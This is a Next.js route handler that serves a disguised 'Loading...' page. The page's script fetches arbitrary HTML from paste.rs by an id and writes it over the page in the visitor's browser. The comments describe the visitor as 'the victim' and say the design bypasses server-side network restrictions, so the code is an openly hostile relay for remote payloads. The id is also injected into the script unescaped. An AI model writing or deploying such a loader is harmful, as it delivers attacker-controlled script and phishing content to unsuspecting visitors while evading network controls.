
import { NextRequest, NextResponse } from 'next/server';

export const revalidate = 0; // Don't cache this response

export async function GET(req: NextRequest, { params }: { params: { id: string } }) {
    const id = params.id;
    if (!id) {
        return new NextResponse('Missing page ID.', { status: 400 });
    }

    // This script runs entirely in the victim's browser.
    // It fetches the content directly from the public paste service,
    // bypassing any server-side network restrictions.
    const clientSideLoader = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Loading...</title>
            <style>
                body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f0f0; }
                .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
        </head>
        <body>
            <div class="loader"></div>
            <script>
                (async () => {
                    try {
                        // The user's browser fetches the content, not our server.
                        const response = await fetch('https://paste.rs/' + '${id}');
                        if (!response.ok) {
                            throw new Error('Failed to load page content. The link may have expired.');
                        }
                        const htmlContent = await response.text();
                        // The fetched HTML replaces the current page content.
                        document.open();
                        document.write(htmlContent);
                        document.close();
                    } catch (error) {
                        console.error('Failed to fetch and render content:', error);
                        document.body.innerHTML = '<h1>Error</h1><p>Unable to load the requested page.</p>';
                    }
                })();
            </script>
        </body>
        </html>
    `;

    return new NextResponse(clientSideLoader, {
        status: 200,
        headers: { 
            'Content-Type': 'text/html; charset=utf-8',
            // Ensure the browser doesn't cache our loader script.
            'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
        },
    });
}
